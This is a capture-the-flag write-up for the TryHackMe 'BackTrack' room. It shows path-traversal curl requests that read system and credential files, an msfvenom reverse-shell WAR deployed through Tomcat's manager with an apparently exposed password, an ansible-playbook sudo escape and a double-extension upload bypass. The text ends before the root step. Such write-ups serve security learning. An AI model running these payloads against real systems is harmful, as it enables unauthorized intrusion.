---
title: "BackTrack CTF"
image: /room_image.webp
categories: [CTFs ,Tryhackme]
tags: [tomcat, pseudo terminal, tty-pushback, ansible, playbook, web shell, RCE, double extension]
media_subpath: /images/backtrack-ctf
author: <author_id>
---

The initial foothold was achieved through the exploitation of a **path traversal** vulnerability, which enabled access to sensitive files on the server. This led to the discovery of **Tomcat** credentials. Using these credentials, we leveraged Tomcat to gain an initial shell on the system.

Further escalation was achieved by exploiting a **wildcard** vulnerability in a sudo command. By crafting a path traversal payload, we executed a malicious **Ansible playbook**, which allowed us to escalate privileges and switch to another user.

As this user, we uncovered credentials for an internal web server. Exploiting an insecure file upload feature on this server, we successfully uploaded a **PHP web shell**, enabling us to obtain a shell as yet another user. While analyzing the processes running under this account, we observed that the root user was executing commands by switching to our user context without allocating a **pseudo-terminal** (**pty**). Capitalizing on this behavior, we employed a **TTY** **pushback** technique to elevate our privileges and achieve root access.


## **Enumeration - Nmap Scan**

```console
$ nmap -sC -sV -p- -Pn -n -T4 10.10.114.233
Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-20 13:43 GMT
Nmap scan report for 10.10.114.233
Host is up (0.036s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
6800/tcp open  http            aria2 downloader JSON-RPC
|_http-title: Site doesn't have a title.
8080/tcp open  http            Apache Tomcat 8.5.93
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.93
8888/tcp open  sun-answerbook?
.....
.....
|     <head>
|     <link rel="icon" href="../favicon.ico" />
|     <meta charset="utf-8">
|     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <meta name="theme-color" content="#0A8476">
|     <title ng-bind="$root.pageTitle">Aria2 WebUI</title>
|     <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Lato:400,
.....
.....
MAC Address: 02:AB:37:E6:4D:E5 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.39 seconds

```

### **Open Ports**

| Ports | Services | Version                   |
| ----- | -------- | ------------------------- |
| 22    | SSH      | OpenSSH 8.2               |
| 6800  | http     | aria2 downloader JSON-RPC |
| 8080  | http     | Apache Tomcat 8.5.93      |
| 8888  | http     | ?                         |

1. port 8080
![Desktop View](/apache-tomcat.webp){: width="1200" height="450" }
2. port 8888

![Desktop View](/port-8888.webp){: width="1200" height="450" }

site navigation:

![Desktop View](/port-8888-version.webp){: width="1200" height="450" }

## **Research** 
After conducting extensive research on various services, we identified a vulnerability in the Aria WebUI. For more details, please refer to this blog. [aria2-webui-path-travesral](https://pentest-tools.com/vulnerabilities-exploits/aria2-webui-path-traversal_22480)

```console
$ curl --path-as-is 'http://10.10.114.233:8888/../../../../../../../../../../../../../../../../../../../../etc/passwd'
root:x:0:0:root:/root:/bin/bash
...
tomcat:x:1002:1002::/opt/tomcat:/bin/false
orville:x:1003:1003::/home/orville:/bin/bash
wilbur:x:1004:1004::/home/wilbur:/bin/bash
```
>You likely have experience working with Apache Tomcat. 
{: .prompt-tip}
>Tomcat File Structure [check](https://stmxcsr.com/micro/tomcat_tree.html)
{: .prompt-info}

```console
$ curl --path-as-is http://10.10.114.233:8888/../../../../../../../../../../../../../../../../../../../../opt/tomcat/conf/tomcat-users.xml
<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">

  <role rolename="manager-script"/>
  <user username="tomcat" password="[***************]" roles="manager-script"/>

</tomcat-users>
```

## FootHold 

### RCE
Using the obtained **Tomcat** credentials, we can deploy an application in the form of a **WAR file** generated with **msfvenom**. This file includes a **web shell**, enabling us to achieve **Remote Code Execution** (**RCE**) on the target system.

```console
$ msfvenom -p java/shell_reverse_tcp lhost=10.10.199.119 lport=9001 -f war -o reverse.war

Payload size: 13034 bytes
Final size of war file: 13034 bytes
Saved as: reverse.war
```

```console
$ curl -v -u tomcat:OPx52k53D8OkTZpx4fr --upload-file reverse.war "http://10.10.114.233:8080/manager/text/deploy?path=/drcpap&update=true"
*   Trying 10.10.114.233:8080...
* TCP_NODELAY set
* Connected to 10.10.114.233 (10.10.114.233) port 8080 (#0)
* Server auth using Basic with user 'tomcat'
> PUT /manager/text/deploy?path=/drcpap&update=true HTTP/1.1
> Host: 10.10.114.233:8080
> Authorization: Basic **********************
> User-Agent: curl/7.68.0
> Accept: */*
> Content-Length: 13036
> Expect: 100-continue
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 100 
* We are completely uploaded and fine
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 
< Cache-Control: private
< X-Frame-Options: DENY
< X-Content-Type-Options: nosniff
< Content-Type: text/plain;charset=utf-8
< Transfer-Encoding: chunked
< Date: Wed, 20 Nov 2024 14:39:59 GMT
< 
OK - Deployed application at context path [/drcpap]
* Connection #0 to host 10.10.114.233 left intact
```

> great now let's us deploy by : curl 10.10.114.233:8080/drcpap

### stabilizing our shell 

```console
$ nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.114.233 36004
python3 -c 'import pty;pty.spawn("/bin/bash");'
tomcat@Backtrack:/$ export TERM=xterm
export TERM=xterm
tomcat@Backtrack:/$ ^Z
[1]+  Stopped                 nc -lvnp 9001
root@ip-10-10-199-119:~# stty raw -echo; fg
nc -lvnp 9001

tomcat@Backtrack:/$ id
uid=1002(tomcat) gid=1002(tomcat) groups=1002(tomcat)
tomcat@Backtrack:/$ cd /opt/tomcat
tomcat@Backtrack:~$ ls
BUILDING.txt	 NOTICE		RUNNING.txt  flag1.txt	temp
CONTRIBUTING.md  README.md	bin	     lib	webapps
LICENSE		 RELEASE-NOTES	conf	     logs	work
tomcat@Backtrack:~$ cat flag1.txt 
THM{*****************************}
```

## **Literal Mouvement** 

### **sudo privilege `wilbur`**

Upon reviewing the **sudo privileges** for the **Tomcat** user, we discovered the ability to execute the command **/usr/bin/ansible-playbook** /opt/test_playbooks/*.yml with elevated privileges as the Wilbur user.

>Ansible-playbook is a YAML-based tool in Ansible for automating tasks like configuration management, application deployment, and system orchestration across multiple systems.
{: .prompt-info}


```console
tomcat@Backtrack:/home$ sudo -l
Matching Defaults entries for tomcat on Backtrack:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tomcat may run the following commands on Backtrack:
    (wilbur) NOPASSWD: /usr/bin/ansible-playbook /opt/test_playbooks/*.yml
```
We can find an example of a playbook that will spawn a shell in [GTFObins](https://gtfobins.github.io/gtfobins/ansible-playbook/#sudo).

running our playbook with the directory traversal payload, we obtain a shell as the wilbur user

```console
tomcat@Backtrack:/opt/test_playbooks$ echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' > /dev/drcpap/shell.yml
tomcat@Backtrack:/opt/test_playbooks$ chmod 777 /dev/drcpap/shell.yml
tomcat@Backtrack:/opt/test_playbooks$ sudo -u wilbur /usr/bin/ansible-playbook /opt/test_playbooks/../../dev/shm/shell.yml
.....
.....
TASK [shell] ******************************************************************************************************************
$ id
uid=1004(wilbur) gid=1004(wilbur) groups=1004(wilbur)
```
here we go we are as wilbur user.

```console
$ ls -al
total 28
drwxrwx--- 3 wilbur wilbur 4096 Nov 20 15:34 .
drwxr-xr-x 4 root   root   4096 Mar  9  2024 ..
drwxrwxr-x 3 wilbur wilbur 4096 Nov 20 15:34 .ansible
lrwxrwxrwx 1 root   root      9 Mar  9  2024 .bash_history -> /dev/null
-rw-r--r-- 1 wilbur wilbur 3771 Mar  9  2024 .bashrc
-rw------- 1 wilbur wilbur   48 Mar  9  2024 .just_in_case.txt
lrwxrwxrwx 1 root   root      9 Mar  9  2024 .mysql_history -> /dev/null
-rw-r--r-- 1 wilbur wilbur 1010 Mar  9  2024 .profile
-rw------- 1 wilbur wilbur  461 Mar  9  2024 from_orville.txt
```

```console
$ cat .just_in_case.txt
in case i forget :

wilbur:******************

```
> this credentails help use to open more stable shell.
{: .prompt-info}

### **Lateral Mouvement `Orville`**

During our investigation, we noticed Orville mentioning an **image gallery web application**. This prompted us to examine the internal open ports, where we identified a web application running 
internally on **port 80**.

```console
$ cat from_orville.txt
Hey Wilbur, it's Orville. I just finished developing the image gallery web app I told you about last week, and it works just fine. However, I'd like you to test it yourself to see if everything works and secure.
I've started the app locally so you can access it from here. I've disabled registrations for now because it's still in the testing phase. Here are the credentials you can use to log in:

email : orville@backtrack.thm
password : ******************

```

Upon inspecting the machine's listening ports, we observed that the mentioned application is running on 127.0.0.1:80.

```console
wilbur@Backtrack:~$ ss -tlnp
State      Recv-Q     Send-Q              Local Address:Port          Peer Address:Port    Process     
LISTEN     0          4096                127.0.0.53%lo:53                 0.0.0.0:*                   
LISTEN     0          128                       0.0.0.0:22                 0.0.0.0:*                   
LISTEN     0          70                      127.0.0.1:33060              0.0.0.0:*                   
LISTEN     0          151                     127.0.0.1:3306               0.0.0.0:*                   
LISTEN     0          1024                      0.0.0.0:6800               0.0.0.0:*                   
LISTEN     0          511                     127.0.0.1:80                 0.0.0.0:*                   
LISTEN     0          128                          [::]:22                    [::]:*                   
LISTEN     0          511                             *:8888                     *:*                   
LISTEN     0          1              [::ffff:127.0.0.1]:8005                     *:*                   
LISTEN     0          100                             *:8080                     *:*                   
LISTEN     0          1024                         [::]:6800                  [::]:*     
```

So we decided to port forward that to our host and look at it.

```console
ssh wilbur@10.10.158.79 -L 5555:127.0.0.1:80
```

>You can use Gobuster or simply begin by attempting to locate the /login.php endpoint.http://localhost:5555/login.php
{: .prompt-info}
>**email** : orville@backtrack.thm **password** : ****************** 
{: .prompt-info}

after logging let's upload a reverse-shell.php

![Desktop View](/reverse-shell-from-webpage.webp){: width="1200" height="450" }


We are unable to upload files with `.php` or executable extensions. However, we can attempt to use the **double extension** technique, such as `reverse-shell.png.php`. While the files are successfully **uploaded** to the server, they do **not execute**. Therefore, let's review the Apache configuration to investigate further. 

```console
wilbur@Backtrack:~$ cat /etc/apache2/apache2.conf
...
<Directory /var/www/html/uploads>
        php_flag engine off
        AddType application/octet-stream php php3 php4 php5 phtml phps phar phpt
</Directory>
...
```
>We have identified the issue: the php_flag engine off directive in the configuration.
{: .prompt-tip}

To execute our web shell, we need to bypass the `/uploads` directory. After testing several directory traversal payloads in the file name during the upload process, we successfully bypassed it using the encoded sequence `%25%32%65%25%32%65%25%32%66`, which is the URL-encoded version of `../`.

![Desktop View](/reverse-shell-double-extension.webp){: width="1200" height="450" }

```console
$ nc -lnvp 9001
listening on [any] 9001 ...
....
*$ python3 -c "import pty;pty.spawn('/bin/bash')"
orville@Backtrack:/$ export TERM=xterm
export TERM=xterm
orville@Backtrack:/$ ^Z
zsh: suspended  nc -lnvp 9001
                                                                                                     $stty raw -echo; fg
[1]  + continued  nc -lnvp 9001

orville@Backtrack:/$ cd /home/orville && ls
flag2.txt  web_snapshot.zip
```
